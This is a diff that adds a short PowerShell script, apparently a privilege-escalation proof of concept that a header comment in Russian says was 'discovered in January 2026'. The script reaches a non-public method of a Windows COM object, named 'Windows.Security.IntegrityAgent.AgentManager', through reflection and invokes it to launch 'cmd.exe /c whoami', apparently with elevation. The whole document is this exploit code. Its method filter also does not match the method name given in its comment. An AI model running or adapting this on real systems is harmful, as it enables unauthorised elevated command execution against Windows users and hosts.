@@ -1,0 +1,10 @@
+#Обнаружен в январе 2026
+$agent = New-Object -ComObject "Windows.Security.IntegrityAgent.AgentManager"
+$type = $agent.GetType()
+
+# Метод LaunchWithElevation
+$method = $type.GetMethods([System.Reflection.BindingFlags]::NonPublic -bor 
+                          [System.Reflection.BindingFlags]::Instance) | 
+          Where-Object {$_.Name -like "Launch"} | Select-Object -First 1
+
+$method.Invoke($agent, @("cmd.exe", "/c whoami", $null, 0))
